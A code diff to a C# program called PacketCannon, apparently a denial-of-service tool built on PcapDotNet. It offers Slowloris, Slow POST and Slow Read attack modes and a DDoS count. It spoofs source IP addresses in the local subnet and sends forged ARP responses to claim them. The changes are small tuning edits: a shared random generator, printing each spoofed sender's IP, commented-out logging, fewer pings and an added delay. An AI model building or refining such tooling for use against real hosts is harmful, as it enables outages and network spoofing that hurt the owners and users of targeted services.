@@ -5,8 +5,6 @@ using PcapDotNet.Packets.Transport;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
-using System.Globalization;
-using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.NetworkInformation;
@@ -47,6 +45,7 @@ namespace PacketCannon
         public int DdosCount = 5;
         public int FakeIpAddressMin = 1;
         public int FakeIpAddressMax = 254;
+        private Random rand = new Random();
 
         public string GetLocalMacAddress(string ipAddress)
         {
@@ -100,6 +99,11 @@ namespace PacketCannon
                 dosSenders.Add(new DosSender(SelectedDevice, SourceIpv4, DestinationIpV4, DestinationMac, SourceMac, HostAddress, SlowLorisKeepAliveData, SlowLorisHeader, SlowPostContentLength, SlowPostHeader, SlowReadUrl, SourcePort, PortStep, Ddos));
             }
 
+            foreach (var dosSender in dosSenders)
+            {
+                Console.WriteLine(dosSender.SourceIpV4.ToString());
+            }
+
             if (_attackMode == Attacks.SlowRead)
             {
                 foreach (var dosSender in dosSenders)
@@ -117,7 +121,7 @@ namespace PacketCannon
             {
                 while (true)
                 {
-                    var logs = "";
+                    //var logs = "";
                     foreach (var dosSender in dosSenders)
                     {
                         switch (dosSender.Status)
@@ -125,7 +129,7 @@ namespace PacketCannon
                             case SenderStat.SendSyn:
                                 dosSender.SendSyn(Communicator);
                                 dosSender.Status = SenderStat.WaitingForAck;
-                                logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)}-- SendingSyn";
+                                // logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)}-- SendingSyn";
                                 break;
 
                             case SenderStat.RecievingSlowRead:
@@ -284,7 +288,7 @@ namespace PacketCannon
                 Communicator.SetFilter("arp and src " + DestinationIpV4);
                 foreach (var fakeIpV4Address in FakeIpV4Addresses)
                 {
-                    for (int i = 0; i < 10; i++)
+                    for (int i = 0; i < 5; i++)
                     {
                         tester.PingAddress(Communicator, fakeIpV4Address);
 
@@ -292,6 +296,7 @@ namespace PacketCannon
                         {
                             break;
                         }
+                        Thread.Sleep(100);
                     }
                     tester.SendArpResponse(Communicator, fakeIpV4Address);
                 }
@@ -301,12 +306,11 @@ namespace PacketCannon
         private void CreateFakeAddresses(int count)
         {
             FakeIpV4Addresses = new List<IpV4Address>();
-            var rnd = new Random();
             var ipAddress = ParseIpAddress(SourceIpv4);
 
             while (FakeIpV4Addresses.Count != count)
             {
-                var ipAddressFaked = new IpV4Address($"{ipAddress[0]}.{ipAddress[1]}.{ipAddress[2]}.{rnd.Next(FakeIpAddressMin, FakeIpAddressMax)}");
+                var ipAddressFaked = new IpV4Address($"{ipAddress[0]}.{ipAddress[1]}.{ipAddress[2]}.{rand.Next(FakeIpAddressMin, FakeIpAddressMax)}");
                 if (!FakeIpV4Addresses.Contains(ipAddressFaked) && !ipAddressFaked.ToString().Equals(SourceIpv4) && !ipAddressFaked.ToString().Equals(DestinationIpV4))
                 {
                     FakeIpV4Addresses.Add(ipAddressFaked);
